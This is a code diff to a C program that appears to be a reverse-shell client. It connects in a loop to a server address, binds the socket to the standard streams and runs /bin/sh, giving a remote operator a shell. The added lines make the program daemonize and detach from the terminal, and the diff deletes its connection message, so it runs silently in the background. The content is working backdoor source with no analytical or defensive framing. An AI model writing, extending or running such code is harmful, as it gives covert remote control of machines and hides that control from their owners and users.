@@ -4,11 +4,21 @@
 #include <unistd.h>
 #include <sys/wait.h>
 #include "../common/common.h"
+#include <fcntl.h>
 
 // #define SERVER_IP "192.168.0.14" 
 #define SERVER_IP "127.0.0.1" 
 
 int main() {
+
+    pid_t pid = fork();
+    if (pid>0){exit(0);}
+    setsid();
+    int devnull = open("/dev/null", O_RDWR);
+    dup2(devnull, 0);  
+    dup2(devnull, 1);  
+    dup2(devnull, 2);  
+    close(devnull); 
     
     while(1){
         int sock_fd = create_socket(AF_INET, SOCK_STREAM);
@@ -21,8 +31,6 @@ int main() {
             continue;
         }
 
-        printf("Server Connected \n");
-
         pid_t pid = fork();
         if (pid == 0){
             dup2(sock_fd, STDIN_FILENO);
@@ -32,6 +40,7 @@ int main() {
             char *args[] = {"/bin/sh", NULL};
             extern char **environ;
             execve("/bin/sh", args, environ);
+            _exit(0);
         }
 
         waitpid(pid, NULL, 0);
